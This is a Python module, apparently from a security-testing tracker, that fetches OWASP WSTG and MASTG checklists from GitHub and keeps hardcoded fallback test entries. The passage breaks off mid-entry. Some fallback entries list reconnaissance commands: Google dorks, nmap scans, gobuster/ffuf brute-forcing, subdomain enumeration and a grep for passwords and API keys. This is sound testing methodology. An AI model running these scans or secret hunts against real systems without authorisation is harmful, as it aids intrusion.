"""
OWASP Service Module

This module handles fetching and parsing OWASP WSTG (Web Security Testing Guide) and 
MSTG (Mobile Security Testing Guide) test data from GitHub repositories.
"""

import requests
import re
import os
import json
from app.utils.datetime_utils import utc_now


class OWASPService:
    @staticmethod
    def fetch_wstg_data():
        """Fetch OWASP WSTG checklist data from GitHub repository"""
        try:
            print("Fetching WSTG data from GitHub...")
            # OWASP WSTG GitHub API endpoint for the stable branch
            api_url = "https://api.github.com/repos/OWASP/wstg/contents/document"
            headers = {'Accept': 'application/vnd.github.v3+json'}
            
            response = requests.get(api_url, headers=headers, timeout=30)
            if response.status_code == 200:
                contents = response.json()
                wstg_tests = []
                
                # Look for test files in the structure
                for item in contents:
                    if item['type'] == 'dir' and 'testing' in item['name'].lower():
                        # Get contents of testing directories
                        testing_url = item['url']
                        testing_response = requests.get(testing_url, headers=headers, timeout=30)
                        
                        if testing_response.status_code == 200:
                            testing_contents = testing_response.json()
                            
                            for subdir in testing_contents:
                                if subdir['type'] == 'dir':
                                    # Get individual test files
                                    subdir_response = requests.get(subdir['url'], headers=headers, timeout=30)
                                    if subdir_response.status_code == 200:
                                        test_files = subdir_response.json()
                                        
                                        for test_file in test_files:
                                            if test_file['name'].endswith('.md') and 'WSTG-' in test_file['name']:
                                                test_data = OWASPService._parse_wstg_file(test_file, headers)
                                                if test_data:
                                                    wstg_tests.append(test_data)
                
                # If we got enough tests from the original method, use them
                if len(wstg_tests) >= 10:
                    OWASPService._save_to_cache('wstg', wstg_tests)
                    OWASPService._update_cache('wstg', 'github', len(wstg_tests))
                    print(f"Successfully fetched {len(wstg_tests)} WSTG tests from GitHub (original method)")
                    return sorted(wstg_tests, key=lambda x: x['id'])
            
            # Original method failed or insufficient data, try checklist fallback
            print("Original method failed or insufficient data, trying checklist fallback...")
            checklist_data = OWASPService._fetch_wstg_from_checklist()
            if len(checklist_data) >= 10:
                OWASPService._save_to_cache('wstg', checklist_data)
                OWASPService._update_cache('wstg', 'github', len(checklist_data))
                print(f"Successfully fetched {len(checklist_data)} WSTG tests from GitHub (checklist method)")
                return checklist_data
            
            # Both methods failed, use fallback
            print("GitHub fetch returned insufficient data, using fallback")
            fallback_data = OWASPService._get_fallback_wstg_data()
            OWASPService._update_cache('wstg', 'fallback', len(fallback_data))
            return fallback_data
            
        except Exception as e:
            print(f"Error fetching WSTG data from GitHub: {e}")
            # Try checklist method as exception fallback
            try:
                print("Trying checklist fallback due to exception...")
                checklist_data = OWASPService._fetch_wstg_from_checklist()
                if len(checklist_data) >= 10:
                    OWASPService._update_cache('wstg', 'github', len(checklist_data))
                    print(f"Successfully fetched {len(checklist_data)} WSTG tests from checklist after exception")
                    return checklist_data
            except Exception as checklist_error:
                print(f"Checklist fallback also failed: {checklist_error}")
            
            # Final fallback
            fallback_data = OWASPService._get_fallback_wstg_data()
            OWASPService._update_cache('wstg', 'fallback', len(fallback_data))
            return fallback_data

    @staticmethod
    def _parse_wstg_file(file_info, headers):
        """Parse individual WSTG test file from GitHub"""
        try:
            # Get the raw content
            file_response = requests.get(file_info['download_url'], headers=headers, timeout=15)
            if file_response.status_code != 200:
                return None
            
            content = file_response.text
            
            # Extract WSTG ID from filename or content
            wstg_id_match = re.search(r'WSTG-[A-Z]+-\d+', file_info['name'])
            if not wstg_id_match:
                wstg_id_match = re.search(r'WSTG-[A-Z]+-\d+', content)
            
            if not wstg_id_match:
                return None
            
            wstg_id = wstg_id_match.group()
            
            # Extract title
            title_match = re.search(r'^#\s+(.+)$', content, re.MULTILINE)
            title = title_match.group(1) if title_match else f"Test {wstg_id}"
            
            # Clean up title if it contains the ID
            title = re.sub(r'^' + re.escape(wstg_id) + r'\s*[-:]?\s*', '', title)
            
            # Extract description from the content
            description_match = re.search(r'## Summary\s*\n(.*?)(?=\n##|\n#|\Z)', content, re.DOTALL)
            if not description_match:
                description_match = re.search(r'## Objective\s*\n(.*?)(?=\n##|\n#|\Z)', content, re.DOTALL)
            if not description_match:
                description_match = re.search(r'## Description\s*\n(.*?)(?=\n##|\n#|\Z)', content, re.DOTALL)
            
            description = description_match.group(1).strip() if description_match else '''Security testing as per OWASP WSTG guidelines.

▼ General Testing Approach:
• Review application functionality and architecture
• Identify potential security vulnerabilities
• Test using manual and automated techniques
• Document findings with evidence and risk assessment
• Provide remediation recommendations

▼ Documentation Requirements:
• Test steps performed and methodology used
• Evidence of vulnerabilities (screenshots, request/response)
• Risk assessment and business impact
• Specific remediation guidance
• Retest validation after fixes'''
            description = re.sub(r'\n+', ' ', description)[:500] + "..." if len(description) > 500 else description
            
            # Determine category based on the ID
            category_map = {
                'INFO': 'Information Gathering',
                'CONF': 'Configuration and Deployment Management Testing',
                'IDNT': 'Identity Management Testing',
                'ATHN': 'Authentication Testing',
                'AUTHZ': 'Authorization Testing',
                'SESS': 'Session Management Testing',
                'INPV': 'Input Validation Testing',
                'ERRH': 'Error Handling',
                'CRYP': 'Cryptography',
                'BUSLOGIC': 'Business Logic Testing',
                'CLNT': 'Client-Side Testing'
            }
            
            category_code = wstg_id.split('-')[1] if '-' in wstg_id else 'MISC'
            category = category_map.get(category_code, 'Miscellaneous Testing')
            
            return {
                'id': wstg_id,
                'title': title,
                'category': category,
                'description': description
            }
            
        except Exception as e:
            print(f"Error parsing WSTG file {file_info['name']}: {e}")
            return None

    @staticmethod
    def fetch_mstg_data():
        """Fetch OWASP MASTG (Mobile Application Security Testing Guide) checklist data from GitHub repository"""
        try:
            print("Fetching MASTG data from GitHub...")
            # Try the new MASTG test structure first
            mastg_tests = []
            
            # Fetch tests from both Android and iOS directories
            test_apis = [
                "https://api.github.com/repos/OWASP/owasp-mastg/contents/tests/android",
                "https://api.github.com/repos/OWASP/owasp-mastg/contents/tests/ios"
            ]
            
            headers = {'Accept': 'application/vnd.github.v3+json'}
            
            for api_url in test_apis:
                try:
                    response = requests.get(api_url, headers=headers, timeout=30)
                    if response.status_code == 200:
                        platform_dirs = response.json()
                        for platform_dir in platform_dirs:
                            if platform_dir['type'] == 'dir':
                                # Get test files from each category directory
                                cat_response = requests.get(platform_dir['url'], headers=headers, timeout=30)
                                if cat_response.status_code == 200:
                                    test_files = cat_response.json()
                                    for test_file in test_files:
                                        if test_file['type'] == 'file' and test_file['name'].endswith('.md'):
                                            test_data = OWASPService._parse_mastg_test_file(test_file, headers)
                                            if test_data:
                                                mastg_tests.append(test_data)
                except Exception as e:
                    print(f"Error fetching from {api_url}: {e}")
                    continue
            
            if len(mastg_tests) >= 50:  # Lower threshold since individual test files
                print(f"Successfully fetched {len(mastg_tests)} MASTG tests from new structure")
                OWASPService._save_to_cache('mstg', mastg_tests)
                OWASPService._update_cache('mstg', 'github', len(mastg_tests))
                return sorted(mastg_tests, key=lambda x: x['id'])
            
            # Fallback: try old checklist approach
            checklist_url = "https://raw.githubusercontent.com/OWASP/owasp-mastg/master/checklists/MASTG-checklist.md"
            response = requests.get(checklist_url, timeout=30)
            if response.status_code == 200:
                content = response.text
                fallback_tests = OWASPService._parse_mastg_checklist(content)
                mastg_tests.extend(fallback_tests)
                print(f"MASTG checklist items found: {len(fallback_tests)}")
                if len(fallback_tests) > 0:
                    print("Sample MASTG items:")
                    for item in fallback_tests[:5]:
                        print(item)
            # If not enough, try other sources
            if len(mastg_tests) < 150:
                urls_to_try = [
                    "https://api.github.com/repos/OWASP/owasp-mastg/contents/Document",
                    "https://raw.githubusercontent.com/OWASP/owasp-mastg/master/Document/0x04a-Mobile-App-Taxonomy.md",
                    "https://raw.githubusercontent.com/OWASP/owasp-mastg/master/Document/0x04b-Mobile-App-Security-Testing.md",
                ]
                for url in urls_to_try:
                    try:
                        if 'api.github.com' in url and '/contents' in url:
                            headers = {'Accept': 'application/vnd.github.v3+json'}
                            resp = requests.get(url, headers=headers, timeout=30)
                            if resp.status_code == 200:
                                contents = resp.json()
                                tests = OWASPService._parse_mastg_directory(contents)
                                mastg_tests.extend(tests)
                        else:
                            resp = requests.get(url, timeout=15)
                            if resp.status_code == 200:
                                content = resp.text
                                tests = OWASPService._parse_mastg_content(content)
                                mastg_tests.extend(tests)
                    except Exception as e:
                        print(f"Failed to fetch from {url}: {e}")
                        continue
            # Deduplicate
            unique_tests = []
            seen_ids = set()
            for test in mastg_tests:
                if test['id'] not in seen_ids:
                    seen_ids.add(test['id'])
                    unique_tests.append(test)
            if len(unique_tests) >= 150:
                OWASPService._save_to_cache('mstg', unique_tests)
                OWASPService._update_cache('mstg', 'github', len(unique_tests))
                print(f"Successfully fetched {len(unique_tests)} MASTG tests from GitHub/checklist")
                return sorted(unique_tests, key=lambda x: x['id'])
            print("GitHub fetch returned insufficient data, using enhanced MASTG fallback data")
            fallback_data = OWASPService._get_enhanced_mastg_data()
            OWASPService._update_cache('mstg', 'fallback', len(fallback_data))
            return fallback_data
        except Exception as e:
            print(f"Error fetching MASTG data from GitHub: {e}")
            fallback_data = OWASPService._get_enhanced_mastg_data()
            OWASPService._update_cache('mstg', 'fallback', len(fallback_data))
            return fallback_data
    @staticmethod
    def _parse_mastg_checklist(content):
        """Parse the official MASTG checklist file for all checks"""
        mastg_tests = []
        # Flexible pattern: - [ ] MSTG-<CATEGORY>-<NUM>: <Description> (colon optional)
        # Improved pattern: - [ ] MSTG-<CATEGORY>-<NUM>: <Description> (colon optional, multiline)
        pattern = r'-\s*\[\s*\]\s*(MSTG-[A-Z]+-\d+):?\s*(.*?)(?=\n- \[|\Z)'
        for match in re.finditer(pattern, content, re.DOTALL | re.MULTILINE):
            test_id = match.group(1)
            description = match.group(2).strip().replace('\n', ' ')
            if len(description) < 5:
                continue
            category_code = test_id.split('-')[1]
            category = OWASPService._get_mastg_category(category_code)
            title = description[:80] + "..." if len(description) > 80 else description
            mastg_tests.append({
                'id': test_id,
                'title': title,
                'category': category,
                'description': f"Verify that {description}"
            })

            print("Parsed MASTG item:", test_id, title, category, description[:50] + "...")
        return mastg_tests

    @staticmethod
    def _fetch_mstg_alternative():
        """Alternative method to fetch MSTG data"""
        try:
            # Try to fetch from the checklist in the main documentation
            api_url = "https://api.github.com/repos/OWASP/owasp-mstg/contents/Document"
            headers = {'Accept': 'application/vnd.github.v3+json'}
            
            response = requests.get(api_url, headers=headers, timeout=30)
            if response.status_code != 200:
                print("Failed to fetch MSTG directory from GitHub, using fallback")
                return OWASPService._get_fallback_mstg_data()
            
            contents = response.json()
            mstg_tests = []
            
            # Look for checklist or requirement files
            for item in contents:
                if item['type'] == 'file' and any(keyword in item['name'].lower() for keyword in ['checklist', 'requirement', 'mstg']):
                    file_response = requests.get(item['download_url'], timeout=15)
                    if file_response.status_code == 200:
                        content = file_response.text
                        parsed_tests = OWASPService._parse_mastg_content(content)
                        mstg_tests.extend(parsed_tests)

            print(mstg_tests)
            
            if len(mstg_tests) >= 5:
                return sorted(mstg_tests, key=lambda x: x['id'])
            
            return OWASPService._get_fallback_mstg_data()
            
        except Exception:
            return OWASPService._get_fallback_mstg_data()

    @staticmethod
    def _parse_mastg_directory(contents):
        """Parse MASTG directory contents from GitHub API"""
        mastg_tests = []
        
        try:
            # Look for relevant files in the directory
            relevant_files = []
            for item in contents:
                if item['type'] == 'file':
                    filename = item['name'].lower()
                    if any(keyword in filename for keyword in [
                        'mastg', 'mstg', 'checklist', 'requirement', 'testing',
                        '0x04', '0x05', '0x06', '0x07', '0x08', '0x09', '0x10'
                    ]):
                        relevant_files.append(item)
            
            # Process each relevant file
            for file_item in relevant_files[:5]:  # Limit to avoid too many requests
                try:
                    if 'download_url' in file_item:
                        response = requests.get(file_item['download_url'], timeout=15)
                        if response.status_code == 200:
                            content = response.text
                            tests = OWASPService._parse_mastg_content(content)
                            mastg_tests.extend(tests)
                except Exception as e:
                    print(f"Error processing file {file_item.get('name', 'unknown')}: {e}")
                    continue
            
            return mastg_tests
            
        except Exception as e:
            print(f"Error parsing MASTG directory: {e}")
            return []

    @staticmethod
    def _parse_mastg_content(content):
        """Enhanced parser for MASTG/MSTG content"""
        mastg_tests = []
        found_items = set()
        # Dedicated pattern for official checklist: - \[ \] (MSTG-([A-Z]+)-(\d+)) (.+)
        checklist_pattern = r'- \[ \] (MSTG-([A-Z]+)-(\d+)) (.+)'
        matches = re.finditer(checklist_pattern, content)
        for match in matches:
            test_id = match.group(1)
            category_code = match.group(2)
            test_num = match.group(3)
            description = match.group(4).strip()
            category = OWASPService._get_mastg_category(category_code)
            description_clean = OWASPService._clean_text(description)
            if len(description_clean) < 10 or len(description_clean) > 400:
                continue
            description_lower = description_clean.lower()
            if description_lower in found_items:
                continue
            found_items.add(description_lower)
            title = description_clean[:80] + "..." if len(description_clean) > 80 else description_clean
            mastg_tests.append({
                'id': test_id,
                'title': title,
                'category': category,
                'description': f"Verify that {description_clean}"
            })
        # If not enough found, fallback to legacy patterns
        if len(mastg_tests) < 150:
            # Legacy/alternative patterns for older/other files
            patterns = [
                r'MSTG-([A-Z]+)-(\d+)[:\s]+([^\n]{10,})',
                r'-\s*\[\s*\]\s*([^\n]{15,})',
                r'#+\s*([A-Z][^\n]{15,}?)(?=\n|$)',
                r'V(\d+)\.(\d+)\s*([^\n]{15,})',
                r'(?:Objective|Goal|Purpose):\s*([^\n]{15,})',
            ]
            test_counter = len(mastg_tests) + 1
            for pattern in patterns:
                matches = re.finditer(pattern, content, re.MULTILINE | re.IGNORECASE)
                for match in matches:
                    try:
                        if 'MSTG-' in pattern and len(match.groups()) >= 3:
                            category_code = match.group(1)
                            test_num = match.group(2)
                            description = match.group(3).strip()
                            test_id = f"MSTG-{category_code}-{test_num}"
                            category = OWASPService._get_mastg_category(category_code)
                        elif len(match.groups()) >= 2:
                            if '.' in match.group(1):
                                section = match.group(1)
                                description = match.group(2).strip()
                                test_id = f"MASTG-REQ-{section.replace('.', '-')}"
                                category = OWASPService._categorize_mstg_content(description)
                            elif match.group(1).isdigit():
                                major = match.group(1)
                                minor = match.group(2)
                                description = match.group(3).strip()
                                test_id = f"MASTG-V{major}-{minor}"
                                category = OWASPService._categorize_mstg_content(description)
                            else:
                                description = match.group(1).strip()
                                test_id = f"MASTG-ITEM-{test_counter:03d}"
                                category = OWASPService._categorize_mstg_content(description)
                        else:
                            description = match.group(1).strip()
                            test_id = f"MASTG-ITEM-{test_counter:03d}"
                            category = OWASPService._categorize_mstg_content(description)
                        description_clean = OWASPService._clean_text(description)
                        if len(description_clean) < 10 or len(description_clean) > 400:
                            continue
                        description_lower = description_clean.lower()
                        if description_lower in found_items:
                            continue
                        found_items.add(description_lower)
                        title = description_clean[:80] + "..." if len(description_clean) > 80 else description_clean
                        mastg_tests.append({
                            'id': test_id,
                            'title': title,
                            'category': category,
                            'description': f"Verify that {description_clean}"
                        })
                        test_counter += 1
                    except Exception as e:
                        print(f"Error processing match: {e}")
                        continue
        return mastg_tests

    @staticmethod
    def _categorize_mstg_content(description):
        """Categorize MASTG content based on description"""
        description_lower = description.lower()
        
        categories = {
            'Architecture, Design and Threat Modeling': [
                'architecture', 'design', 'threat', 'model', 'component', 'structure'
            ],
            'Data Storage and Privacy': [
                'data', 'storage', 'privacy', 'database', 'file', 'cache', 'preference'
            ],
            'Cryptography': [
                'crypto', 'encryption', 'decrypt', 'key', 'cipher', 'hash', 'signature'
            ],
            'Authentication and Session Management': [
                'authentication', 'session', 'login', 'password', 'biometric', 'token'
            ],
            'Network Communication': [
                'network', 'communication', 'https', 'tls', 'ssl', 'certificate', 'api'
            ],
            'Platform Interaction': [
                'platform', 'interaction', 'permission', 'intent', 'url', 'scheme'
            ],
            'Code Quality and Build Environment': [
                'code', 'quality', 'build', 'debug', 'obfuscation', 'binary'
            ],
            'Resilience Against Reverse Engineering': [
                'reverse', 'engineering', 'tamper', 'protection', 'anti-debug'
            ]
        }
        
        for category, keywords in categories.items():
            if any(keyword in description_lower for keyword in keywords):
                return category
        
        return 'General Mobile Security'

    @staticmethod
    def _clean_text(text):
        """Clean and normalize text content"""
        # Remove markdown formatting
        text = re.sub(r'\[([^\]]+)\]\([^)]+\)', r'\1', text)  # Remove links
        text = re.sub(r'[*_`#]', '', text)  # Remove formatting
        text = re.sub(r'\s+', ' ', text)  # Normalize whitespace
        return text.strip()

    @staticmethod
    def _get_mastg_category(category_code):
        """Map MSTG category codes to full names"""
        category_map = {
            'ARCH': 'Architecture, Design and Threat Modeling Requirements',
            'STORAGE': 'Data Storage and Privacy Requirements',
            'CRYPTO': 'Cryptography Requirements',
            'AUTH': 'Authentication and Session Management Requirements',
            'NETWORK': 'Network Communication Requirements',
            'PLATFORM': 'Platform Interaction Requirements',
            'CODE': 'Code Quality and Build Setting Requirements',
            'RESILIENCE': 'Resilience Against Reverse Engineering Requirements'
        }
        return category_map.get(category_code, 'Mobile Security Requirements')

    @staticmethod
    def _get_enhanced_mastg_data():
        """Enhanced fallback MASTG data as backup (comprehensive)"""
        # This is a curated, comprehensive fallback based on the official OWASP MASTG checklist and categories
        return [
            {
                'id': 'MSTG-ARCH-1',
                'title': 'All app components are identified and known to be needed',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': 'Verify that all application components are identified, necessary, and that unused components are removed.'
            },
            {
                'id': 'MSTG-ARCH-2',
                'title': 'Security controls are never enforced only on the client side',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': 'Ensure that security controls are enforced on a trusted remote endpoint and not solely on the client.'
            },
            {
                'id': 'MSTG-ARCH-3',
                'title': 'A high-level architecture has been defined and security has been addressed',
                'category': 'Architecture, Design and Threat Modeling Requirements',
                'description': 'Verify that a high-level architecture has been defined for the mobile app and all remote services.'
            },
            {
                'id': 'MSTG-STORAGE-1',
                'title': 'System credential storage facilities are used appropriately',
                'category': 'Data Storage and Privacy Requirements',
                'description': 'Verify that system credential storage facilities are used appropriately to store sensitive data.'
            },
            {
                'id': 'MSTG-STORAGE-2',
                'title': 'No sensitive data is stored outside of the app container or system credential storage',
                'category': 'Data Storage and Privacy Requirements',
                'description': 'Ensure that sensitive data is not stored outside the app sandbox or system credential storage.'
            },
            {
                'id': 'MSTG-STORAGE-3',
                'title': 'No sensitive data is written to application logs',
                'category': 'Data Storage and Privacy Requirements',
                'description': 'Verify that no sensitive data is written to application logs.'
            },
            {
                'id': 'MSTG-CRYPTO-1',
                'title': 'The app does not rely on symmetric cryptography with hardcoded keys',
                'category': 'Cryptography Requirements',
                'description': 'Ensure the app does not rely on symmetric cryptography with hardcoded keys as a sole method of encryption.'
            },
            {
                'id': 'MSTG-CRYPTO-2',
                'title': 'Cryptographic primitives are used properly',
                'category': 'Cryptography Requirements',
                'description': 'Verify that cryptographic primitives are used according to best practices.'
            },
            {
                'id': 'MSTG-AUTH-1',
                'title': 'Authentication is implemented using secure mechanisms',
                'category': 'Authentication and Session Management Requirements',
                'description': 'Verify that authentication is implemented using secure mechanisms.'
            },
            {
                'id': 'MSTG-AUTH-2',
                'title': 'Session management is implemented securely',
                'category': 'Authentication and Session Management Requirements',
                'description': 'Verify that session management is implemented securely.'
            },
            {
                'id': 'MSTG-NETWORK-1',
                'title': 'Network communication is secured using TLS',
                'category': 'Network Communication Requirements',
                'description': 'Verify that network communication is secured using TLS.'
            },
            {
                'id': 'MSTG-NETWORK-2',
                'title': 'Certificate validation is implemented correctly',
                'category': 'Network Communication Requirements',
                'description': 'Verify that certificate validation is implemented correctly.'
            },
            {
                'id': 'MSTG-PLATFORM-1',
                'title': 'Platform interaction follows security best practices',
                'category': 'Platform Interaction Requirements',
                'description': 'Verify that platform interaction follows security best practices.'
            },
            {
                'id': 'MSTG-CODE-1',
                'title': 'Code quality and build settings are secure',
                'category': 'Code Quality and Build Setting Requirements',
                'description': 'Verify that code quality and build settings are secure.'
            },
            {
                'id': 'MSTG-RESILIENCE-1',
                'title': 'App is resilient against reverse engineering',
                'category': 'Resilience Against Reverse Engineering Requirements',
                'description': 'Verify that the app is resilient against reverse engineering.'
            }
        ]

    @staticmethod
    def _get_fallback_wstg_data():
        """Enhanced fallback WSTG data as backup"""
        return [
            {
                'id': 'WSTG-INFO-01',
                'title': 'Conduct Search Engine Discovery Reconnaissance for Information Leakage',
                'category': 'Information Gathering',
                'description': '''Use search engines to discover sensitive information that may be inadvertently exposed.

▼ What to Test:
• Search for domain in Google, Bing, DuckDuckGo using site:domain.com
• Look for exposed files, directories, error messages, stack traces
• Check for leaked credentials, API keys, internal documentation
• Search for cached pages that might reveal old/sensitive content

▼ How to Test:
1. Use Google dorking: site:example.com filetype:pdf OR filetype:doc
2. Search for: site:example.com "error" OR "exception" OR "stack trace"
3. Check: site:example.com inurl:admin OR inurl:login OR inurl:config
4. Use tools like theHarvester, Google Hacking Database (GHDB)
5. Review search results for sensitive information exposure

▼ Risk Indicators:
• Database connection strings or credentials in indexed files
• Error messages revealing file paths or system information
• Admin interfaces or sensitive directories in search results
• Cached pages showing outdated or internal content'''
            },
            {
                'id': 'WSTG-INFO-02',
                'title': 'Fingerprint Web Server',
                'category': 'Information Gathering',
                'description': '''Identify web server software, version, and configuration to understand potential attack vectors.

▼ What to Test:
• Server header revealing web server type and version
• Server-specific response characteristics and error pages
• Default files and directories that indicate server type
• Response timing and behavior patterns

▼ How to Test:
1. Check HTTP response headers: curl -I http://example.com
2. Send malformed requests to trigger error pages
3. Check for default files: /server-status, /server-info (Apache)
4. Use tools: Nmap, Nikto, whatweb, httprint
5. Banner grabbing: telnet example.com 80, then send HTTP request

▼ Example Commands:
• nmap -sV -p 80,443 example.com
• whatweb example.com
• curl -I -X OPTIONS http://example.com

▼ Risk Indicators:
• Detailed server version information exposed
• Default error pages revealing server type
• Outdated server versions with known vulnerabilities
• Unnecessary server modules or features enabled'''
            },
            {
                'id': 'WSTG-INFO-03',
                'title': 'Review Webserver Metafiles for Information Leakage',
                'category': 'Information Gathering',
                'description': '''Analyze robots.txt, sitemap.xml and other metafiles for sensitive information disclosure.

▼ What to Test:
• robots.txt file revealing hidden directories and files
• sitemap.xml exposing site structure and sensitive URLs
• .well-known directory contents
• Other metadata files like humans.txt, security.txt

▼ How to Test:
1. Check robots.txt: curl http://example.com/robots.txt
2. Review sitemap.xml: curl http://example.com/sitemap.xml
3. Test .well-known: curl http://example.com/.well-known/security.txt
4. Look for: crossdomain.xml, clientaccesspolicy.xml
5. Check for humans.txt, ads.txt, app-ads.txt

▼ Files to Check:
• /robots.txt - Disallowed paths might reveal sensitive areas
• /sitemap.xml - Complete site structure mapping
• /.well-known/security.txt - Security contact information
• /crossdomain.xml - Flash cross-domain policies
• /clientaccesspolicy.xml - Silverlight policies

▼ Risk Indicators:
• Admin areas listed in robots.txt disallow directives
• Sensitive URLs exposed in sitemap.xml
• Overly permissive cross-domain policies
• Information leakage about site structure and hidden content'''
            },
            {
                'id': 'WSTG-INFO-04',
                'title': 'Enumerate Applications on Webserver',
                'category': 'Information Gathering',
                'description': '''Identify all applications and services running on the web server.

▼ What to Test:
• Virtual hosts and subdomains on the same server
• Different applications accessible through various paths
• Services running on non-standard ports
• Application-specific directories and endpoints

▼ How to Test:
1. DNS enumeration: dig example.com, dnsrecon -d example.com
2. Subdomain discovery: sublist3r -d example.com, amass enum -d example.com
3. Port scanning: nmap -sS -O example.com
4. Directory enumeration: dirb, gobuster, dirsearch
5. Virtual host discovery: Host header manipulation

▼ Tools and Commands:
• nmap -p- example.com (full port scan)
• gobuster dir -u http://example.com -w /path/to/wordlist
• ffuf -u http://example.com/FUZZ -w wordlist.txt
• Use different Host headers to discover virtual hosts

▼ Risk Indicators:
• Multiple applications with different security levels
• Forgotten or unmaintained applications
• Development/staging environments accessible
• Admin interfaces on non-standard ports'''
            },
            {
                'id': 'WSTG-INFO-05',
                'title': 'Review Webpage Content for Information Leakage',
                'category': 'Information Gathering',
                'description': '''Examine webpage source code and content for sensitive information exposure.

▼ What to Test:
• HTML comments containing sensitive information
• JavaScript files with hardcoded credentials or API keys
• Metadata in images and documents
• Hidden form fields and disabled elements
• Source code comments and debug information

▼ How to Test:
1. View page source: Ctrl+U or curl -s http://example.com
2. Check JavaScript files: Review all .js files for secrets
3. Extract metadata: exiftool image.jpg
4. Search for patterns: grep -r "password\\|api_key\\|secret" ./
5. Browser developer tools: Network tab, Sources tab

▼ What to Look For:
• <!-- TODO: remove hardcoded password -->
• var apiKey = "sk-12345abcdef";
• Database connection strings in JS
• Internal IP addresses and server names
• Debug information and stack traces

▼ Risk Indicators:
• Hardcoded credentials or API keys in source
• Internal system information exposed
• Development comments left in production
• Sensitive business logic revealed in client-side code'''
            },
            {
                'id': 'WSTG-CONF-01',
                'title': 'Test Network Infrastructure Configuration',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Test the network infrastructure configuration for security misconfigurations and vulnerabilities.

▼ What to Test:
• Network service configurations and exposed ports
• Firewall rules and network segmentation
• Load balancer and proxy configurations
• Network protocol security settings

▼ How to Test:
1. Port scanning: nmap -sS -sV -sC target
2. Service enumeration: nmap --script=default target
3. SSL/TLS testing: nmap --script ssl-enum-ciphers -p 443 target
4. Check for admin interfaces on unusual ports
5. Test network connectivity and filtering

▼ Common Issues:
• Unnecessary services running (SSH, FTP, Telnet)
• Weak SSL/TLS configurations
• Management interfaces exposed to internet
• Default credentials on network devices
• Insecure network protocols (SNMPv1, HTTP)

▼ Tools to Use:
• Nmap for comprehensive port/service scanning
• SSLyze for SSL/TLS configuration testing
• testssl.sh for SSL security assessment
• Masscan for fast port scanning'''
            },
            {
                'id': 'WSTG-CONF-02',
                'title': 'Test Application Platform Configuration',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Verify that the application platform is securely configured according to best practices.

▼ What to Test:
• Web server configuration (Apache, Nginx, IIS)
• Application server settings (Tomcat, JBoss, etc.)
• Database configuration and access controls
• Operating system hardening and patch levels

▼ How to Test:
1. Review web server config files: httpd.conf, nginx.conf
2. Check for default accounts and passwords
3. Verify file permissions and ownership
4. Test directory listings and file access
5. Review error page configurations

▼ Configuration Areas:
• Server signature and version disclosure
• Directory browsing enabled/disabled
• File upload restrictions and validation
• Session timeout and security settings
• Logging and monitoring configurations

▼ Example Checks:
• curl -I http://example.com (check Server header)
• Check if http://example.com/uploads/ shows directory listing
• Verify error pages don't reveal system information
• Test file upload functionality for bypasses'''
            },
            {
                'id': 'WSTG-CONF-03',
                'title': 'Test File Extensions Handling for Sensitive Information',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Test how the web server handles different file extensions and potential information disclosure.

▼ What to Test:
• Backup files with common extensions (.bak, .old, .tmp)
• Source code files (.php.bak, .aspx.cs, .java)
• Configuration files (.config, .ini, .properties)
• Archive files (.zip, .tar, .rar) containing source code

▼ How to Test:
1. Test common backup extensions: file.php.bak, file.php~
2. Try source code extensions: .cs, .vb, .java for compiled apps
3. Look for config files: web.config, .htaccess, database.properties
4. Check for compressed archives: backup.zip, source.tar.gz
5. Use automated tools: DirBuster, dirb, gobuster

▼ File Extensions to Test:
• .bak, .backup, .old, .orig, .save, .tmp
• .inc, .conf, .config, .ini, .properties
• .cs, .vb, .java (for .NET/Java apps)
• .zip, .tar, .gz, .rar, .7z

▼ Risk Indicators:
• Source code files accessible via web
• Database configuration files exposed
• Backup files containing sensitive information
• Development files left on production server'''
            },
            {
                'id': 'WSTG-CONF-04',
                'title': 'Review Old Backup and Unreferenced Files for Sensitive Information',
                'category': 'Configuration and Deployment Management Testing',
                'description': '''Search for backup files, old versions, and unreferenced files that may contain sensitive information.

▼ What to Test:
• Backup files created by editors or deployment scripts
• Old versions of applications or components
• Forgotten administrative tools and interfaces
• Archive files and database dumps

▼ How to Test:
1. Directory enumeration with backup-focused wordlists
2. Check common backup locations: /backup/, /old/, /archive/
3. Look for editor backup files: file.php~, .file.php.swp
4. Search for database dumps: backup.sql, dump.sql
5. Use tools like dirb, gobuster with backup extensions

▼ Common Backup Patterns:
• index.php.bak, login.asp.old
• backup_20231215.sql, database_dump.sql
• admin_old/, maintenance/, dev/
• .DS_Store, Thumbs.db, .svn/, .git/

▼ Tools and Wordlists:
• SecLists backup file wordlists
• gobuster with backup extensions: -x bak,old,tmp
• Find version control directories: /.git/, /.svn/'''
            },
            {
                'id': 'WSTG-CONF-05',
                'title': 'Enumerate Infrastructure and Application Admin Interfaces',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Identify and assess administrative interfaces that may be accessible.'
            },
            {
                'id': 'WSTG-CONF-06',
                'title': 'Test HTTP Methods',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Test for enabled HTTP methods that may pose security risks such as PUT, DELETE, TRACE.'
            },
            {
                'id': 'WSTG-CONF-07',
                'title': 'Test HTTP Strict Transport Security',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Verify the presence and proper implementation of HTTP Strict Transport Security (HSTS).'
            },
            {
                'id': 'WSTG-CONF-08',
                'title': 'Test RIA Cross Domain Policy',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Test Rich Internet Application cross-domain policy files for security misconfigurations.'
            },
            {
                'id': 'WSTG-CONF-09',
                'title': 'Test File Permission',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Verify that file permissions are properly configured to prevent unauthorized access.'
            },
            {
                'id': 'WSTG-CONF-10',
                'title': 'Test for Subdomain Takeover',
                'category': 'Configuration and Deployment Management Testing',
                'description': 'Test for subdomain takeover vulnerabilities through misconfigured DNS records.'
            },
            {
                'id': 'WSTG-IDNT-01',
                'title': 'Test Role Definitions',
                'category': 'Identity Management Testing',
                'description': 'Verify that user roles are properly defined and enforced throughout the application.'
            },
            {
                'id': 'WSTG-IDNT-02',
                'title': 'Test User Registration Process',
                'category': 'Identity Management Testing',
                'description': 'Test the user registration process for security vulnerabilities and business logic flaws.'
            },
            {
                'id': 'WSTG-IDNT-03',
                'title': 'Test Account Provisioning Process',
                'category': 'Identity Management Testing',
